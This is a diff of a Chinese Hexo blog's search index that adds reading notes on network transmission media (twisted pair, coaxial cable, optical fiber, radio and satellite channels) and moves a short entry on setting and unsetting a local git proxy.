+<li>双绞线由两根绝缘的铜线组成，以规则的螺旋状排列着</li>
+<li><strong>无屏蔽双绞线（Unshielded Twisted Pair，UTP）</strong>常用在建筑物内的计算机网络中，即用于局域网（LAN）中</li>
+<li>目前局域网中的双绞线的数据传输速率从10Mbps导10Gbps，所能达到的数据传输速率取决于线的粗细以及传输方和接收方之间的距离</li>
+</ul>
+<h3 id="2、同轴电缆"><a href="#2、同轴电缆" class="headerlink" title="2、同轴电缆"></a>2、同轴电缆</h3><ul>
+<li>与双绞线类似，由两个铜导体组成但是这两个导体是同心的而不是并行的，借助这种结构及特殊的绝缘体和保护层，同轴电缆能够达到较高的数据传输速率</li>
+<li>同轴电缆能被用作导引型<strong>共享媒体（shared medium）</strong>，特别是，许多端系统能够直接与该电缆相连，每个端系统都能接收由其他端系统发送的内容</li>
+</ul>
+<h3 id="3、光纤"><a href="#3、光纤" class="headerlink" title="3、光纤"></a>3、光纤</h3><ul>
+<li>光纤是一种细而柔软的、能够导引光脉冲的媒体，每个脉冲表示一个比特</li>
+<li>一根光纤能够支持极高的比特速率，高达数十甚至数百Gbps</li>
+<li>它们不受电磁干扰，信号衰减极低，成为长途导引型传输媒体，特别是跨海链路</li>
+</ul>
+<h3 id="4、陆地无线电信道"><a href="#4、陆地无线电信道" class="headerlink" title="4、陆地无线电信道"></a>4、陆地无线电信道</h3><ul>
+<li>无线电信道承载电磁频谱中的信号</li>
+<li>它能穿透墙壁，因此极大依赖传播环境和信号传输的距离：<ol>
+<li>路径损耗和遮挡衰落（信号跨距离传播和穿过阻碍物体时信号强度降低）</li>
+<li>多径衰落（干扰对象的信号反射）</li>
+<li>干扰（其他传输或电磁信号）</li>
+</ol>
+</li>
+<li>陆地无线电信道大致分为三类：一类运行在很短距离（如1m或2m）；另一类运行在局域，通常跨越数十到几百米；第三类运行在广域，跨越数万米</li>
+</ul>
+<h3 id="5、卫星无线电信道"><a href="#5、卫星无线电信道" class="headerlink" title="5、卫星无线电信道"></a>5、卫星无线电信道</h3><p>一颗通信卫星连接地球上的两个或多个微波发射器/接收器，它们被称为地面站。该卫星在一个频段上接收传输，使用一个转发器再生信号，并在另一个频率上发射信号。通信中尝试用两类卫星：<strong>同步卫星（geostationary satellite）</strong>和<strong>近地轨道（Low-Earth Orbiting，LEO）</strong>卫星。</p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>read</tag>
       </tags>
   </entry>
   <entry>
@@ -2307,19 +2307,6 @@
       <tags>
         <tag>web</tag>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git clone出错</title>
-    <url>/2022/01/09/study-1/</url>
-    <content><![CDATA[<h4 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> http.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> https.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br></pre></td></tr></table></figure>
-<h4 id="如果无效则输入："><a href="#如果无效则输入：" class="headerlink" title="如果无效则输入："></a>如果无效则输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> --unset https.proxy</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
       </tags>
   </entry>
   <entry>
@@ -2439,6 +2426,19 @@
 <p>方法：文件夹右键属性—安全—高级—勾上第二个对号即可</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例：</span><br><span class="line">123文件夹下有许多个子文件夹及文件，由于长时间的权限管理，多个子文件夹的权限都做过不同的权限修改，现需要该文件夹下的所有子文件夹及子文件的权限全部统一</span><br></pre></td></tr></table></figure>
 <h3 id="4-7-文件复制对权限的影响"><a href="#4-7-文件复制对权限的影响" class="headerlink" title="4.7 文件复制对权限的影响"></a>4.7 文件复制对权限的影响</h3><p>文件复制后，文件的权限被目标文件夹的权限覆盖</p>
+]]></content>
+      <categories>
+        <category>基础知识和笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git clone出错</title>
+    <url>/2022/01/09/study-1/</url>
+    <content><![CDATA[<h4 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> http.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> https.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br></pre></td></tr></table></figure>
+<h4 id="如果无效则输入："><a href="#如果无效则输入：" class="headerlink" title="如果无效则输入："></a>如果无效则输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> --unset https.proxy</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>基础知识和笔记</category>
